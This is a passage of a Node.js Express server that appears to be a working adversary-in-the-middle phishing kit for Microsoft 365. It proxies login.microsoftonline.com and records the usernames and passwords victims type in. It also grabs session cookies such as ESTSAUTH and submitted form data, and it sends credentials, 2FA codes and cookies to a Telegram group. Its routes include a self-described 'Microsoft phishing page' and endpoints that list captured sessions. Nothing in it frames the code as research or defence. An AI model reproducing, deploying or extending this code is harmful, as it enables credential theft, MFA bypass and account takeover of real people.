    if (req.query.redirect && req.query.redirect !== '#') {
      return res.redirect(302, req.query.redirect);
    }
    
    res.status(500).json({ error: 'Error capturing cookies' });
  }
});

app.post('/capture', express.urlencoded({ extended: true }), async (req, res) => {
  try {
    const {
      source = 'form',
      campaign = 'unknown',
      email = req.body.email || 'unknown',
      redirect = req.body.redirect || 'https://google.com'
    } = req.query;

    const cookies = req.cookies || {};
    const formData = req.body || {};

    const ip = requestIp.getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const agent = useragent.parse(userAgent);
    
    let location = 'Unknown';
    try {
      const geo = geoip.lookup(ip);
      if (geo) {
        location = `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'}`;
      }
    } catch (e) {}

    const captureTime = new Date().toLocaleString();
    const token = crypto.randomBytes(4).toString('hex').toUpperCase();

    if (bot && telegramGroupId) {
      const cookiesText = Object.keys(cookies).length > 0 
        ? Object.entries(cookies).map(([k, v]) => `• *${k}*: \`${v}\``).join('\n')
        : 'No cookies';
      
      const formText = Object.keys(formData).length > 0
        ? Object.entries(formData).map(([k, v]) => `• *${k}*: \`${v}\``).join('\n')
        : 'No form data';

      const message = 
        `📝 *Form + Cookies Captured!*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Token:* \`${token}\`\n` +
        `*Source:* ${source}\n` +
        `*Campaign:* ${campaign}\n` +
        `*IP:* \`${ip}\`\n` +
        `*Location:* ${location}\n` +
        `*Time:* ${captureTime}\n\n` +
        `*Cookies (${Object.keys(cookies).length}):*\n${cookiesText}\n\n` +
        `*Form Data (${Object.keys(formData).length}):*\n${formText}`;

      await bot.sendMessage(telegramGroupId, message, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });
    }

    res.redirect(302, redirect);

  } catch (error) {
    console.error('❌ Error in POST capture:', error);
    res.redirect(302, req.query.redirect || 'https://google.com');
  }
});


// ============= WORKING MICROSOFT PROXY =============
// const { createProxyMiddleware } = require('http-proxy-middleware');
const MICROSOFT_LOGIN_URL = 'https://login.microsoftonline.com';

// Store captured data
const capturedData = new Map();

// Create the proxy middleware
const microsoftProxy = createProxyMiddleware({
  target: MICROSOFT_LOGIN_URL,
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  selfHandleResponse: true,
  logLevel: 'debug',
  
  on: {
    proxyReq: (proxyReq, req, res) => {
      const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
      console.log(`\n🔄 [${sessionId}] PROXY REQUEST:`);
      console.log(`   Method: ${req.method}`);
      console.log(`   URL: ${req.url}`);
      console.log(`   Target: ${MICROSOFT_LOGIN_URL}${req.url}`);
      
      // Set proper headers
      proxyReq.setHeader('Host', 'login.microsoftonline.com');
      proxyReq.setHeader('Origin', 'https://login.microsoftonline.com');
      
      // Capture credentials from POST
      if (req.method === 'POST' && req.body) {
        console.log(`   📦 POST Data:`, req.body);
        
        const session = capturedData.get(sessionId) || {
          id: sessionId,
          startTime: Date.now(),
          credentials: {},
          cookies: []
        };
        
        if (req.body.login) {
          session.credentials.username = req.body.login;
          console.log(`   📧 Username:`, req.body.login);
        }
        if (req.body.passwd) {
          session.credentials.password = req.body.passwd;
          console.log(`   🔑 Password:`, req.body.passwd);
        }
        
        capturedData.set(sessionId, session);
        
        // Send Telegram alert
        if (req.body.login && req.body.passwd && bot && telegramGroupId) {
          bot.sendMessage(telegramGroupId, 
            `🔑 *Credentials Captured!*\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `*Session:* \`${sessionId}\`\n` +
            `*Email:* \`${req.body.login}\`\n` +
            `*Password:* \`${req.body.passwd}\`\n` +
            `*Time:* ${new Date().toLocaleString()}`,
            { parse_mode: 'Markdown' }
          ).catch(e => console.log('Telegram error:', e.message));
        }
      }
    },
    
    proxyRes: (proxyRes, req, res) => {
      const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
      console.log(`\n📥 [${sessionId}] PROXY RESPONSE: ${proxyRes.statusCode}`);
      
      // Capture cookies
      const cookies = proxyRes.headers['set-cookie'];
      if (cookies) {
        console.log(`   🍪 Cookies (${cookies.length}):`);
        cookies.forEach((cookie, i) => {
          console.log(`      ${i+1}. ${cookie.substring(0, 100)}`);
          
          if (cookie.includes('ESTSAUTH') || cookie.includes('MSISAuth')) {
            console.log(`      🔥 CRITICAL SESSION COOKIE!`);
            
            const session = capturedData.get(sessionId) || { cookies: [] };
            if (!session.cookies) session.cookies = [];
            session.cookies.push(cookie);
            capturedData.set(sessionId, session);
            
            // Send cookie alert
            if (bot && telegramGroupId) {
              bot.sendMessage(telegramGroupId,
                `🍪 *SESSION COOKIE CAPTURED!*\n` +
                `━━━━━━━━━━━━━━━━━━\n` +
                `*Session:* \`${sessionId}\`\n` +
                `*Cookie:* \`${cookie.substring(0, 100)}...\`\n` +
                `*Time:* ${new Date().toLocaleString()}`,
                { parse_mode: 'Markdown' }
              ).catch(e => console.log('Telegram error:', e.message));
            }
          }
        });
      }
      
      // Forward response
      let body = [];
      proxyRes.on('data', chunk => body.push(chunk));
      proxyRes.on('end', () => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        res.end(Buffer.concat(body));
      });
    },
    
    error: (err, req, res) => {
      console.error('❌ Proxy Error:', err.message);
      res.writeHead(500, { 'Content-Type': 'text/html' });
      res.end(`
        <html>
          <head><title>Error</title></head>
          <body>
            <h2>Connection Error</h2>
            <p>Unable to connect to Microsoft. Please try again.</p>
            <p><small>${err.message}</small></p>
            <a href="/microsoft">Go Back</a>
          </body>
        </html>
      `);
    }
  }
});

// IMPORTANT: This MUST be before express.json() and express.urlencoded()
// Move these BEFORE your other middleware if needed
app.use('/proxy', express.urlencoded({ extended: true }));
app.use('/proxy', express.json());

// Mount the proxy
app.use('/proxy', (req, res, next) => {
  console.log(`\n🎯 PROXY ROUTE: ${req.method} ${req.url}`);
  console.log('   Query:', req.query);
  console.log('   Body:', req.body);
  
  // Ensure session ID is in query
  if (req.body?.sessionId && !req.query.sessionId) {
    req.query.sessionId = req.body.sessionId;
  }
  
  microsoftProxy(req, res, next);
});

// Add test endpoint
app.get('/proxy-test', (req, res) => {
  res.json({
    status: 'Proxy is mounted',
    target: MICROSOFT_LOGIN_URL,
    sessions: capturedData.size,
    routes: app._router.stack
      .filter(r => r.route)
      .map(r => r.route.path)
  });
});

app.get('/test-microsoft', async (req, res) => {
  try {
    const response = await fetch('https://login.microsoftonline.com/common/discovery/instance');
    const data = await response.text();
    res.json({ success: true, data: data.substring(0, 200) });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});


// Serve the Microsoft phishing page
app.get('/microsoft', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'microsoft-login.html'));
});

// Debug endpoint
app.get('/proxy-debug', (req, res) => {
  res.json({
    status: 'Proxy configured',
    target: MICROSOFT_LOGIN_URL,
    sessions: capturedSessions.size,
    timestamp: new Date().toISOString()
  });
});

// View captured sessions
app.get('/captured-sessions', (req, res) => {
  const sessions = Array.from(capturedSessions.entries()).map(([id, data]) => ({
    id,
    username: data.credentials?.username,
    hasPassword: !!data.credentials?.password,
    has2FA: !!data.credentials?.totp,
    cookieCount: data.cookies?.length,
    stepCount: data.steps?.length,
    time: new Date(data.startTime).toLocaleString()
  }));
  
  res.json({
    total: capturedSessions.size,
    sessions
  });
});

// View specific captured session
app.get('/captured-sessions/:sessionId', (req, res) => {
  const session = capturedSessions.get(req.params.sessionId);
  if (!session) {
    return res.status(404).json({ error: 'Session not found' });
  }
  res.json(session);
});

// Telegram alert helper functions
async function sendCredentialAlert(sessionId, session) {
  if (!bot || !telegramGroupId) return;
  
  const message = 
    `🔑 *Credentials Captured!*\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `*Session:* \`${sessionId}\`\n` +
    `*Username:* \`${session.credentials?.username || 'N/A'}\`\n` +
    `*Password:* \`${session.credentials?.password || 'N/A'}\`\n` +
    `*IP:* \`${session.ip || 'Unknown'}\`\n` +
    `*Time:* ${new Date().toLocaleString()}`;
  
  try {
    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' });
    console.log(`✅ Credential alert sent for ${sessionId}`);
  } catch (err) {
    console.error('❌ Telegram error:', err.message);
  }
}

async function sendTwoFactorAlert(sessionId, session, code) {
  if (!bot || !telegramGroupId) return;
  
  const message = 
    `🔢 *2FA Code Captured!*\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `*Session:* \`${sessionId}\`\n` +
    `*Username:* \`${session.credentials?.username || 'N/A'}\`\n` +
    `*2FA Code:* \`${code}\`\n` +
    `*Time:* ${new Date().toLocaleString()}`;
  
  try {
    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error('❌ Telegram error:', err.message);
  }
}

async function sendCookieAlert(sessionId, session, cookies) {
  if (!bot || !telegramGroupId) return;
  
  const cookieText = cookies.map(c => {
    const match = c.match(/([^=]+)=([^;]+)/);
    if (match) {
      return `• *${match[1]}*: \`${match[2].substring(0, 30)}...\``;
    }
    return `• \`${c.substring(0, 50)}...\``;
  }).join('\n');
  
  const message = 
    `🍪 *SESSION COOKIES CAPTURED!*\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `*Session:* \`${sessionId}\`\n` +
    `*Username:* \`${session.credentials?.username || 'N/A'}\`\n` +
    `*Cookies:*\n${cookieText}\n\n` +
    `*Time:* ${new Date().toLocaleString()}`;
  
  try {
    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' });
    console.log(`🔥 Cookie alert sent for ${sessionId}`);
  } catch (err) {
    console.error('❌ Telegram error:', err.message);
  }
}

// ============= TEST ENDPOINTS =============
app.get('/test', (req, res) => {
  res.json({ 
    status: 'ok', 
    message: 'Server is running',
    timestamp: new Date().toISOString(),
    activeSessions: activeSessions.size,
    capturedSessions: capturedSessions.size,
    sessionTimeoutMinutes: SESSION_TIMEOUT / 60000,
    codeExpirationMinutes: CODE_EXPIRATION_TIME / 60000
  });
});

app.get('/sessions', (req, res) => {
  for (const [sessionId, session] of activeSessions.entries()) {
    cleanupStaleSockets(session);
  }
  
  const sessionsInfo = Array.from(activeSessions.entries()).map(([sessionId, session]) => ({
    sessionId,
    email: session.email,
    stage: session.stage,
    createdAt: new Date(session.createdAt).toLocaleString(),
    lastActivity: new Date(session.lastActivity).toLocaleString(),
    ageMinutes: Math.round((Date.now() - session.createdAt) / 60000),
    inactivityMinutes: Math.round((Date.now() - session.lastActivity) / 60000),
    socketCount: session.sockets.size
  }));
  
  res.json({
    totalSessions: activeSessions.size,
    sessions: sessionsInfo
  });
});

app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    activeSessions: activeSessions.size,
    capturedSessions: capturedSessions.size,
    uptime: process.uptime(),
    sessionTimeout: `${SESSION_TIMEOUT / 60000} minutes`,
    codeExpiration: `${CODE_EXPIRATION_TIME / 60000} minutes`
  });
});

// This should be last - catch-all route
app.get(/.*/, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============= START SERVER =============
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📁 Serving static files from: ${path.join(__dirname, 'public')}`);
  console.log(`🔗 Test endpoint: http://localhost:${PORT}/test`);
  console.log(`📊 Sessions endpoint: http://localhost:${PORT}/sessions`);
  console.log(`❤️ Health endpoint: http://localhost:${PORT}/health`);
  console.log(`🎯 Microsoft phishing page: http://localhost:${PORT}/microsoft`);
  console.log(`🔍 Proxy debug: http://localhost:${PORT}/proxy-debug`);
  console.log(`🍪 Captured sessions: http://localhost:${PORT}/captured-sessions`);
});